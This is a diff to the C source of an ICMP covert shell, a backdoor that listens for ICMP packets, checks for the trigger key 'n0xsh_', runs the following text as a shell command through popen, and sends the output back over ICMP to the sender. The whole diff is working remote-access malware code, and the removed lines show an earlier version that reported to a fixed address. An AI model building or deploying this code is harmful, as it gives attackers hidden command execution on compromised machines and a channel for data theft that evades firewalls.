@@ -1,4 +1,3 @@
-
 #include "icmp_shell.h"
 #include "buffer.h"
 #include <string.h>
@@ -25,7 +24,7 @@ typedef unsigned char uint8;
     }while(0);
 
 //#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小
-#define MAX_BUFF_SIZE  1000 // max data size can send 
+#define MAX_BUFF_SIZE  1000 // max data size can send
 #define SLEEP_TIME 1000
 #define IN_BUF_SIZE 1024
 #define OUT_BUF_SIZE 64
@@ -185,7 +184,8 @@ void *receive_icmp_data(void *lparam){
   flags = fcntl(0, F_GETFL, 0);
   flags |= O_NONBLOCK;
   fcntl(0, F_SETFL, flags);
-
+  char shell_key[] = "n0xsh_";
+  char *word = "cd ";
 
 // read data from socket
   while(1){
@@ -204,41 +204,55 @@ void *receive_icmp_data(void *lparam){
           //printf("%s", data);
           fflush(stdout);
         }
-        
+
+          //char *shell_key = "n0xsh_";
+          //printf("start");
+          char *verify;
+          verify = strstr(data, shell_key);
+          //printf("PONTEIRO: %c", *verify);
+          //printf("chegou ate o verify\n");
+
+
+          if (verify != 0){
           //printf("test");
-          char pwd[100];
-          char buffercd[50];
-          char pwdbuff[100];
-          sprintf(buffercd, "%c%c%c", data[0], data[1], data[2]);
-          printf("Command: %s", data);
-          //printf("cd: %s", buffercd);
-          if (buffercd == "cd "){
-            //printf("is equal\n");
-            char path[200];
-            strncpy(path,data+3,strlen(data)-3);
-            chdir(path);
-            sprintf(pwd, "Moved to: %s", getcwd(pwdbuff, 100));
-            icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), pwd, sizeof(pwd));
-          }
-          
-          FILE *output;
-          char buffer[BUFFER2]; 
-          char commandoutput[BUFFER2];
-          output = popen(data,"r");
-          if (output == NULL){
-            icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "Error executing popen", 21);
-            //fputs("Error executing popen", stderr);
-          }else{
-            while(fgets(buffer,BUFFER2-1,output) != NULL){
-              icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), buffer, sizeof(buffer));
-              //strcpy(commandoutput, buffer);
+            char exec_command[2048];
+            char pwd[100];
+            char pwdbuff[100];
+
+            strncpy(exec_command,data+6,strlen(data)-6);
+            //printf("Command: %s", data);
+            //printf("cd: %s", buffercd);
+
+            // Test chdir in dirs, feature not working in the moment
+            //if (strstr(data, word) != NULL){
+              //printf("is equal\n");
+              //char path[200];
+              //strncpy(path,exec_command+3,strlen(exec_command)-3);
+              //chdir(path);
+              //sprintf(pwd, "Moved to: %s", getcwd(pwdbuff, 100));
+              //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), pwd, sizeof(pwd));
+            //}
+
+            FILE *output;
+            char buffer[BUFFER2];
+            char commandoutput[BUFFER2];
+            output = popen(exec_command,"r");
+            if (output == NULL){
+              icmp_sendrequest(sockfd, ip->saddr, "Error executing popen", 21);
+              //fputs("Error executing popen", stderr);
+            }else{
+              while(fgets(buffer,BUFFER2-1,output) != NULL){
+                icmp_sendrequest(sockfd, ip->saddr, buffer, sizeof(buffer));
+                //strcpy(commandoutput, buffer);
+              }
+              memset(exec_command, 0x00, 2048);
             }
+          }else{
+            //printf("key invalida");
+            icmp_sendrequest(sockfd, ip->saddr, data, sizeof(data));
           }
-          //fflush(stdout);
-          //memset(data, 0x00, nbytes);
-          //strcpy(data, commandoutput);
-          //printf("Data: %s\n", data);
-          
+
+
       }
       //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), commandoutput, sizeof(commandoutput));
 
@@ -314,7 +328,7 @@ int main(int argc, char **argv){
         //启动一个线程来读取
         //hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
         //hShellRead = MyCreateThread(ShellPipe_ReadThread, NULL);
-        
+
 
         //if (0 == hIcmpRecv || 0 == hShellRead)
         //{
@@ -323,26 +337,26 @@ int main(int argc, char **argv){
         //waitpid(g_child_pid, NULL, 0); //等待子进程退出
         //dbg_msg("%s:child exit. ..\n", __func__);
         //write(g_icmp_soick,"sincoder",8);
-        
-        
+
+
         //printf("Sending hello\n");
-        
+
         //hello();
-        
-        icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
+
+        //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
         //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
         pthread_t hIcmpRecv;
         hIcmpRecv = MyCreateThread(receive_icmp_data, NULL);
         //receive_icmp_data();
         close(g_icmp_sock);
         pthread_join(hIcmpRecv, NULL);
-        
+
         //icmp_sendrequest(g_icmp_sock, inet_addr("192.168.1.13"), "hello", 5);
         //printf("HELLO SEND SUCESFULY\n");
         //printf("data received\n");
     ////icmp_sendrequest(g_icmp_sock, inet_addr("127.0.0.1"), "sincoder", 8);
-        
-          
+
+
         //close(g_icmp_sock); //tell the icmp_recv thread exit ...
         //close(read_pipe[0]);
         //close(write_pipe[1]);
